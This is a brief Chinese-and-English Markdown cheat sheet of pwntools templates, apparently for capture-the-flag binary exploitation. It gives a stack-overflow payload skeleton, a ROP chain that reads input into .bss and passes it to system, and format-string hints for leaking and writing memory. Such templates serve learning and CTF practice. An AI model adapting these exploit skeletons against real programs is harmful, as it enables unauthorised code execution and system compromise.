# Pwn Templates (精简版)

## 栈溢出
```python
from pwn import *
p = process('./binary')
payload = b'A'*offset + p64(leak_addr)
p.sendline(payload)
p.interactive()
```

## ROP
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.read(0, elf.bss(0x100))
rop.system(elf.bss(0x100))
payload = b'A'*offset + rop.chain()
```

## Format String
```python
# 泄露: %p %x
# 写入: %n
```
